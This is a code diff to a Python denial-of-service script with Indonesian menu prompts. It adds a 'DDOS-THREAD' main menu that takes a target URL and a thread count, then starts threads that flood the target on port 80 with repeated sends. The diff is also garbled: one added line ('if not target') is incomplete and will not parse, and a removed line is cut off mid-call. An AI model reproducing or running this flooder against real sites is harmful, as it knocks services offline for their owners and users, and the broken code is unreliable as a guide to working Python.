@@ -339,10 +339,10 @@ def launch_ghost_sequence():
 
     if choice == '1':
         target = input("Masukkan target (contoh: https://target.com): ")
+        if not target
         if not target.startswith("http://") and not target.startswith("https://"):
             target = "http://" + target
 
-        target = target.replace("http://", "").replace
         target = target.replace("http://", "").replace("https://", "")
 
         port = 80  # Default HTTP port
@@ -365,6 +365,34 @@ def ddos(target, port, duration):
     while duration > 0:
         client.send(payload)
         duration -= 1
+
+def main():
+    print("""
+    DDOS-THREAD
+    """)
+
+    print("[ 1 ] Target : ")
+    print("[ 2 ] Exit ")
+    choice = input("Pilih opsi: ")
+
+    if choice == '1':
+        target = input("Masukkan target (contoh: https://target.com): ")
+        if not target.startswith("http://") and not target.startswith("https://"):
+            target = "http://" + target
+
+        target = target.replace("http://", "").replace("https://", "")
+
+        port = 80  # Default HTTP port
+
+        threads = int(input("Threads : "))
+
+        for _ in range(threads):
+            thread = threading.Thread(target=ddos, args=(target, port, 60))
+            thread.start()
+
+    elif choice == '2':
+        print("Exiting...")
+        exit()
 
 if __name__ == "__main__":
     main()
